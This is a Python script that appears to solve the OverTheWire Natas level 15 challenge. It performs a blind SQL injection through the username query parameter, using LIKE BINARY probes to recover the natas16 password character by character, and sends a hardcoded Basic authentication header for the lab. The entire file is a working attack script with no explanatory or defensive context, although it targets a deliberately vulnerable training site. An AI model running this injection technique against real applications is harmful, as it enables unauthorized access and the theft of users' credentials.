import requests,string
base_url ="http://natas15.natas.labs.overthewire.org/index.php?username="
characters = ''.join([string.ascii_letters,string.digits])
auth_headers = {'Authorization': 'Basic bmF0YXMxNTpBd1dqMHc1Y3Z4clppT05nWjlKNXN0TlZrbXhkazM5Sg=='} 

done=False
passwd=''
passwd_len = len(passwd)

def check(query):
    res = requests.get(base_url + query, headers=auth_headers)
    if("error" in res.text.lower()):
        print("ERROR")
    if("doesn't" in res.text):
        return False
    return True

while not done:
    for c in characters:
        query=f'natas16" and password LIKE BINARY "%{passwd}{c}%&debug'
        alt_query=f'natas16" and password LIKE BINARY "%{c}{passwd}%&debug'
        if(check(query)):
            passwd += c
        elif(check(alt_query)):
            passwd = c + passwd
        if(check(f'natas16" and password LIKE BINARY "{passwd}&debug')):
            done = True
        elif(passwd_len != len(passwd)):
            passwd_len = len(passwd)
            print(passwd)

print(f"PASSWORD: {passwd}")
# check(f'natas16" and password LIKE BINARY "{passwd}&debug')
